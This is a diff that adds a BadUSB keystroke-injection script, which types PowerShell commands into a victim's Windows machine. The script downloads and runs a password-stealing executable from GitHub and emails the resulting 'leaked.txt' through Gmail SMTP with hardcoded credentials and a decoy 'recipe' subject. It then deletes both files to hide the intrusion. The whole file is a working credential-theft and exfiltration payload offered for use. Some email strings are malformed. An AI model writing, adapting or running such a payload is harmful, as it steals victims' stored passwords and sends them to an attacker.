@@ -1,0 +1,106 @@
+REM DOWNLOAD AND USE PASSWORD STEALER
+DELAY 1000
+GUI r 
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 900
+STRING Invoke-WebRequest 'https://github.com/r00t-3xp10it/meterpeter/raw/master/mimiRatz/DarkRCovery.exe' -OutFile 'Downloads\DarkRCovery.exe'                                                                                                                                                                                                                                   
+DELAY 300 
+ENTER
+DELAY 1900
+STRING cd .\Downloads\
+ENTER
+DELAY 1500 
+STRING start-process .\DarkRCovery.exe  
+ENTER
+DELAY 500 
+STRING exit
+ENTER
+REM email with gmail
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+DELAY 2000
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+DELAY 2000
+STRING $SMTPPort = '587'
+ENTER
+DELAY 2000
+STRING $Username = 'joemamajeffxdxd"gmail.com'
+ENTER
+DELAY 2000
+STRING $Password = 'joemamaxd'
+ENTER
+DELAY 2000
+STRING $to = 'penislicker99919"gmail.com'
+ENTER
+DELAY 2000
+STRING $subject = @The Recipe you wanted@
+ENTER
+DELAY 2000
+STRING $body = @One cup of brown rice@
+ENTER
+DELAY 2000
+STRING $attachment = 'Downloads\leaked.txt'
+ENTER
+DELAY 2000
+STRING $message = New-Object System.Net.Mail.MailMessage
+ENTER
+DELAY 2000
+STRING $message.subject = $subject
+ENTER
+DELAY 2000
+STRING $message.body = $body
+ENTER
+DELAY 2000
+STRING $message.to.add($to)
+ENTER
+DELAY 1000 
+STRING $message.from = $username
+ENTER
+DELAY 2000
+STRING $message.attachments.add($attachment)
+ENTER
+DELAY 2000
+STRING $smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
+ENTER
+DELAY 2000
+STRING $smtp.EnableSSL = $true
+ENTER
+DELAY 2000
+STRING $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
+ENTER
+DELAY 2000
+STRING $smtp.send($message)
+ENTER
+DELAY 2000
+STRING exit
+ENTER
+DELAY 1500
+REM NOW WE NEED TO DELETE WHAT WE DOWNLOADED 
+GUI r 
+DELAY 1400 
+STRING powershell
+ENTER
+DELAY 1000
+STRING cd .\Downloads\
+DELAY 900
+ENTER
+STRING del .\leaked.txt
+DELAY 700 
+ENTER
+DELAY 500
+STRING del .\DarkRCovery.exe
+DELAY 800
+ENTER
+STRING exit
+ENTER
+
+
+
